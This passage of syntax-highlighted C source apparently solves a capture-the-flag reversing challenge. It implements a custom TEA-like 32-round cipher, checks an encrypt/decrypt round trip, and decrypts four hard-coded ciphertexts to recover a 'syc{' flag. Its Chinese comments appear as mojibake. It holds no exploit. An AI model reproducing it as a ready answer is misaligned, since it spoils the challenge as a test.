</span></span><span class="line"><span class="cl">    <span class="n">bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)((</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)((</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)((</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// åŠ å¯†å‡½æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">encrypt_32_rounds</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="n">var_c_bytes</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">var_18_bytes</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">var_c</span> <span class="o">=</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">var_c_bytes</span><span class="p">);</span>  <span class="c1">// å‰å››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint32_t</span> <span class="n">var_18</span> <span class="o">=</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">var_18_bytes</span><span class="p">);</span> <span class="c1">// åå››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint32_t</span> <span class="n">var_6c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ç¬¬1æ­¥ï¼šè®¡ç®—var_6c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint32_t</span> <span class="n">temp1</span> <span class="o">=</span> <span class="p">(</span><span class="n">var_18</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint32_t</span> <span class="n">temp2</span> <span class="o">=</span> <span class="p">(</span><span class="n">var_18</span> <span class="o">+</span> <span class="p">((</span><span class="mi">9</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">var_6c</span> <span class="o">=</span> <span class="n">temp1</span> <span class="o">^</span> <span class="n">temp2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">     
</span></span><span class="line"><span class="cl">        <span class="c1">// ç¬¬2æ­¥ï¼šè®¡ç®—e
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">e</span> <span class="o">=</span> <span class="p">((</span><span class="n">var_18</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="n">var_6c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">        <span class="c1">// ç¬¬3æ­¥ï¼šæ›´æ–°var_c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">var_c</span> <span class="o">=</span> <span class="n">e</span> <span class="o">+</span> <span class="n">var_c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// ç¬¬4æ­¥ï¼šæ›´æ–°var_6c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">var_6c</span> <span class="o">=</span> <span class="p">(</span><span class="n">var_c</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// ç¬¬5æ­¥ï¼šå†æ¬¡æ›´æ–°var_6c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint32_t</span> <span class="n">temp3</span> <span class="o">=</span> <span class="p">(</span><span class="n">var_c</span> <span class="o">+</span> <span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">var_6c</span> <span class="o">=</span> <span class="n">temp3</span> <span class="o">^</span> <span class="n">var_6c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// ç¬¬6æ­¥ï¼šæ›´æ–°var_18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint32_t</span> <span class="n">shr5</span> <span class="o">=</span> <span class="n">var_c</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">var_18</span> <span class="o">=</span> <span class="p">((</span><span class="n">shr5</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="n">var_6c</span><span class="p">)</span> <span class="o">+</span> <span class="n">var_18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">uint32_to_bytes_le</span><span class="p">(</span><span class="n">var_c</span><span class="p">,</span> <span class="n">var_c_bytes</span><span class="p">);</span>   <span class="c1">// åŠ å¯†åçš„å‰å››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">uint32_to_bytes_le</span><span class="p">(</span><span class="n">var_18</span><span class="p">,</span> <span class="n">var_18_bytes</span><span class="p">);</span> <span class="c1">// åŠ å¯†åçš„åå››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// è§£å¯†å‡½æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">decrypt_32_rounds</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="n">var_c_bytes</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">var_18_bytes</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">var_c</span> <span class="o">=</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">var_c_bytes</span><span class="p">);</span>  <span class="c1">// åŠ å¯†åçš„å‰å››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint32_t</span> <span class="n">var_18</span> <span class="o">=</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">var_18_bytes</span><span class="p">);</span> <span class="c1">// åŠ å¯†åçš„åå››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint32_t</span> <span class="n">var_6c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// é€†å‘32æ¬¡å¾ªç¯ï¼Œä»32åˆ°1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ä¿å­˜å½“å‰å€¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint32_t</span> <span class="n">prev_var_c</span> <span class="o">=</span> <span class="n">var_c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint32_t</span> <span class="n">prev_var_18</span> <span class="o">=</span> <span class="n">var_18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// é€†å‘æ­¥éª¤6ï¼šæ¢å¤var_18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// é‡æ–°è®¡ç®—åŠ å¯†æ—¶çš„var_6cï¼ˆæ­¥éª¤4-5ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">var_6c</span> <span class="o">=</span> <span class="p">(</span><span class="n">prev_var_c</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint32_t</span> <span class="n">temp3</span> <span class="o">=</span> <span class="n">prev_var_c</span> <span class="o">+</span> <span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">var_6c</span> <span class="o">=</span> <span class="n">temp3</span> <span class="o">^</span> <span class="n">var_6c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="kt">uint32_t</span> <span class="n">shr5</span> <span class="o">=</span> <span class="n">prev_var_c</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">var_18</span> <span class="o">=</span> <span class="n">prev_var_18</span> <span class="o">-</span> <span class="p">(((</span><span class="n">shr5</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="n">var_6c</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// é€†å‘æ­¥éª¤3ï¼šæ¢å¤var_c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// é‡æ–°è®¡ç®—åŠ å¯†æ—¶çš„eï¼ˆæ­¥éª¤1-2ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint32_t</span> <span class="n">temp1</span> <span class="o">=</span> <span class="p">(</span><span class="n">var_18</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint32_t</span> <span class="n">temp2</span> <span class="o">=</span> <span class="n">var_18</span> <span class="o">+</span> <span class="p">((</span><span class="mi">9</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">var_6c</span> <span class="o">=</span> <span class="n">temp1</span> <span class="o">^</span> <span class="n">temp2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">e</span> <span class="o">=</span> <span class="p">((</span><span class="n">var_18</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="n">var_6c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">var_c</span> <span class="o">=</span> <span class="n">prev_var_c</span> <span class="o">-</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">uint32_to_bytes_le</span><span class="p">(</span><span class="n">var_c</span><span class="p">,</span> <span class="n">var_c_bytes</span><span class="p">);</span>   <span class="c1">// è§£å¯†åçš„å‰å››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">uint32_to_bytes_le</span><span class="p">(</span><span class="n">var_18</span><span class="p">,</span> <span class="n">var_18_bytes</span><span class="p">);</span> <span class="c1">// è§£å¯†åçš„åå››ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// æµ‹è¯•ç”¨ä¾‹ï¼šéªŒè¯åŠ å¯†å’Œè§£å¯†
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;=== æµ‹è¯•ç”¨ä¾‹ï¼šéªŒè¯åŠ å¯†å’Œè§£å¯† ===</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">test_var_c</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">};</span>   <span class="c1">// å‰å››ä¸ªå­—èŠ‚ &#34;syc{&#34; -&gt; 0x7B637973
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">test_var_18</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">};</span>  <span class="c1">// åå››ä¸ªå­—èŠ‚ &#34;abcd&#34; -&gt; 0x64636261
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;åŸå§‹å€¼ï¼š</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;å‰å››ä¸ªå­—èŠ‚: 0x%08X (&#34;</span><span class="p">,</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">test_var_c</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="n">test_var_c</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;åå››ä¸ªå­—èŠ‚: 0x%08X (&#34;</span><span class="p">,</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">test_var_18</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="n">test_var_18</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;)</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// åŠ å¯†
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">encrypted_var_c</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="n">encrypted_var_18</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">encrypted_var_c</span><span class="p">,</span> <span class="n">test_var_c</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">encrypted_var_18</span><span class="p">,</span> <span class="n">test_var_18</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">encrypt_32_rounds</span><span class="p">(</span><span class="n">encrypted_var_c</span><span class="p">,</span> <span class="n">encrypted_var_18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;åŠ å¯†åï¼š</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;å‰å››ä¸ªå­—èŠ‚: 0x%08X (å­—èŠ‚åºåˆ—: &#34;</span><span class="p">,</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">encrypted_var_c</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;0x%02X &#34;</span><span class="p">,</span> <span class="n">encrypted_var_c</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;åå››ä¸ªå­—èŠ‚: 0x%08X (å­—èŠ‚åºåˆ—: &#34;</span><span class="p">,</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">encrypted_var_18</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;0x%02X &#34;</span><span class="p">,</span> <span class="n">encrypted_var_18</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;é¢„æœŸç»“æœï¼š</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;å‰å››ä¸ªå­—èŠ‚: 0x4CF8EE9B (å­—èŠ‚åºåˆ—: 0x9B 0xEE 0xF8 0x4C)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;åå››ä¸ªå­—èŠ‚: 0xAB322F31 (å­—èŠ‚åºåˆ—: 0x31 0x2F 0x32 0xAB)</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// è§£å¯†
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">decrypt_32_rounds</span><span class="p">(</span><span class="n">encrypted_var_c</span><span class="p">,</span> <span class="n">encrypted_var_18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;è§£å¯†åï¼š</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;å‰å››ä¸ªå­—èŠ‚: 0x%08X (&#34;</span><span class="p">,</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">encrypted_var_c</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="n">encrypted_var_c</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;åå››ä¸ªå­—èŠ‚: 0x%08X (&#34;</span><span class="p">,</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="n">encrypted_var_18</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="n">encrypted_var_18</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">memcmp</span><span class="p">(</span><span class="n">test_var_c</span><span class="p">,</span> <span class="n">encrypted_var_c</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> 
</span></span><span class="line"><span class="cl">        <span class="nf">memcmp</span><span class="p">(</span><span class="n">test_var_18</span><span class="p">,</span> <span class="n">encrypted_var_18</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;æµ‹è¯•ç”¨ä¾‹ï¼šæˆåŠŸï¼</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;æµ‹è¯•ç”¨ä¾‹ï¼šå¤±è´¥ï¼</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// è§£å¯†å››ç»„å¯†æ–‡
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;=== è§£å¯†å››ç»„å¯†æ–‡ ===</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">encrypted_texts</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;9A8C0C4BC412FF1C&#34;</span><span class="p">,</span>  <span class="c1">// å‰å››ä¸ªå­—èŠ‚=0x9A8C0C4B, åå››ä¸ªå­—èŠ‚=0x0C412FF1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s">&#34;BFC3A488B16C8FD0&#34;</span><span class="p">,</span>  <span class="c1">// å‰å››ä¸ªå­—èŠ‚=0x0BFC3A48, åå››ä¸ªå­—èŠ‚=0x80B16C8F
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s">&#34;4136E3198835E4FF&#34;</span><span class="p">,</span>  <span class="c1">// å‰å››ä¸ªå­—èŠ‚=0x4136E319, åå››ä¸ªå­—èŠ‚=0x8835E4FF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s">&#34;118263A77C85D629&#34;</span>   <span class="c1">// å‰å››ä¸ªå­—èŠ‚=0x118263A7, åå››ä¸ªå­—èŠ‚=0x7C85D629
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;ç¬¬%dç»„å¯†æ–‡: 0x%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">encrypted_texts</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// å°†64ä½å¯†æ–‡æ‹†åˆ†ä¸ºä¸¤ä¸ª32ä½æ•´æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint32_t</span> <span class="n">first</span><span class="p">,</span> <span class="n">second</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sscanf</span><span class="p">(</span><span class="n">encrypted_texts</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;%8x%8x&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">first</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">second</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// å‰å››ä¸ªå­—èŠ‚æ˜¯var_cï¼Œåå››ä¸ªå­—èŠ‚æ˜¯var_18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint8_t</span> <span class="n">first_bytes</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="n">second_bytes</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">uint32_to_bytes_le</span><span class="p">(</span><span class="n">first</span><span class="p">,</span> <span class="n">first_bytes</span><span class="p">);</span>   <span class="c1">// var_c (å‰å››ä¸ªå­—èŠ‚)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">uint32_to_bytes_le</span><span class="p">(</span><span class="n">second</span><span class="p">,</span> <span class="n">second_bytes</span><span class="p">);</span> <span class="c1">// var_18 (åå››ä¸ªå­—èŠ‚)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;è§£æä¸º: å‰å››ä¸ªå­—èŠ‚=0x%08X, åå››ä¸ªå­—èŠ‚=0x%08X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">first</span><span class="p">,</span> <span class="n">second</span><span class="p">);</span>
